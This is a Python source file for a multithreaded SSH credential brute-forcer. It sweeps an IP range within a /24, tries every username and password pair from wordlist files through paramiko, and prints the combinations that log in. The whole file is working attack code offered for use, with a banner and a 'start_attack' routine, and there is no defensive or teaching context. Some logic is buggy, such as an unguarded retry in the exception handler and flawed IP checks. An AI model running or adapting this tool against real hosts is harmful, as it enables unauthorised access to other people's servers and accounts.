from time import sleep
import paramiko
from optparse import OptionParser
import threading
import sys


def judge_ip(start_ip: str, end_ip=None) -> bool:
    if end_ip is None:
        ip_list = start_ip.split('.')
        if len(ip_list) != 4:
            sys.stderr.write("[-] ip format error\n")
            return False
        for i in range(4):
            if not 0 < int(ip_list[i]) < 255:
                sys.stderr.write("[-] ip range should between 0-255\n")
                return False
    else:
        start_ip_list = start_ip.split('.')
        end_ip_list = end_ip.split('.')
        if len(start_ip_list) != len(end_ip_list) != 4:
            sys.stderr.write("ip format error\n")
            return False
        for i in range(3):
            if start_ip_list[i] != end_ip_list[i]:
                sys.stderr.write("[-] please input the right ip around /24\n")
                return False
        if int(start_ip_list[3]) > int(end_ip_list[3]):
            sys.stderr.write("[-] start ip must shorter than end ip\n")
            return False
        for i in range(4):
            if (not 0 < int(start_ip_list[i]) < 255) or (not 0 < int(end_ip_list[i]) < 255):
                sys.stderr.write("[-] ip range should between 0-255\n")
                return False
    return True


def judge_dic(username_dic: str, password_dic: str) -> bool:
    if password_dic is None or username_dic is None:
        sys.stderr.write("[-] please input the username dic or password dic\n")
        return False
    try:
        f1 = open(password_dic, 'r')
        f2 = open(username_dic, 'r')
        f1.close()
        f2.close()
        return True
    except:
        sys.stderr.write("[-] please input the real dic\n")
        return False


def start_connect(ip: str, port: int, username: str, password: str) -> None:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(hostname=ip, port=port, username=username, password=password, timeout=2)
        ssh_session = client.get_transport().open_session()
        if ssh_session.active:
            ssh_session.exec_command("id")
            print("{}: {} ==> {}@{}".format(ip, port, username, password))
            return True
    except Exception as e:
        sleep(0.1)
        client.connect(hostname=ip, port=port, username=username, password=password, timeout=2)
        ssh_session = client.get_transport().open_session()
        if ssh_session.active:
            ssh_session.exec_command("id")
            print("{}: {} ==> {}@{}".format(ip, port, username, password))
            return True
    finally:
        client.close()


class ssh_hosts:
    def __init__(self):
        self.ip_list = []
        self.port = 0
        # dics are files
        self.username_dic = ''
        self.password_dic = ''
        self.username = ''
        self.password = ''
        self.thread_list = []

    def set_ip_list(self, start_ip: str, end_ip: str):
        self.ip_list = []
        if end_ip is None:
            if judge_ip(start_ip):
                self.ip_list.append(start_ip)
        else:
            if judge_ip(start_ip, end_ip):
                tmp_start_ip = start_ip.split('.')
                tmp_end_ip = end_ip.split(".")
                for i in range(int(tmp_start_ip[3]), int(tmp_end_ip[3]) + 1):
                    ip = tmp_start_ip[0] + '.' + tmp_start_ip[1] + '.' + tmp_start_ip[2] + '.' + str(i)
                    self.ip_list.append(ip)

    def set_port(self, port):
        self.port = port

    def set_dic(self, username_dic: str, password_dic: str):
        if judge_dic(username_dic, password_dic):
            self.username_dic = username_dic
            self.password_dic = password_dic

    def start_attack(self):
        print("[+] now start attack")
        port = self.port
        for ip in self.ip_list:
            user_file = open(self.username_dic, 'r')
            for username in user_file.readlines():
                name = username[:-1]
                pass_file = open(self.password_dic, 'r')
                for password in pass_file.readlines():
                    # sleep(0.1)
                    passwd = password[:-1]
                    thread = threading.Thread(target=start_connect, args=(ip, port, name, passwd))
                    self.thread_list.append(thread)
                pass_file.close()
            user_file.close()

        for thread in self.thread_list:
            thread.start()


def parse_args():
    parser = OptionParser()
    parser.add_option("-P", "--password", dest="password_dic", type='string', help='password dic')
    parser.add_option("-U", "--user", dest='username_dic', type='string', help='username dic')
    parser.add_option("-i", "--ip", dest='ip', type='string', help='enum ip')
    parser.add_option("-s", "--start", dest='start_ip', type='string', help='enum start')
    parser.add_option("-e", "--end", dest='end_ip', type='string', help='enum end')
    parser.add_option("-p", "--port", dest='port', type='int', help='enum port', default=22)
    parser.add_option("-o", "--output", dest='file_name', type='string', help='write output to a file')
    options, args = parser.parse_args()
    return options, args


def get_attack_host(opt) -> ssh_hosts:
    dst = ssh_hosts()
    if opt.port is not None:
        dst.set_port(port=opt.port)
    if opt.ip is not None:
        dst.set_ip_list(opt.ip)
    if opt.start_ip is not None and opt.end_ip is not None:
        dst.set_ip_list(opt.start_ip, opt.end_ip)
    if opt.username_dic is not None and opt.password_dic is not None:
        dst.set_dic(opt.username_dic, opt.password_dic)

    return dst


def logo() -> None:
    print("+==========================+")
    print("|      author: stdout      |")
    print("+==========================+")
    print("|   function: enum ssh     |")
    print("+==========================+")


def main():
    logo()
    options, args = parse_args()
    dst_hosts = get_attack_host(options)
    dst_hosts.start_attack()


if __name__ == '__main__':
    main()
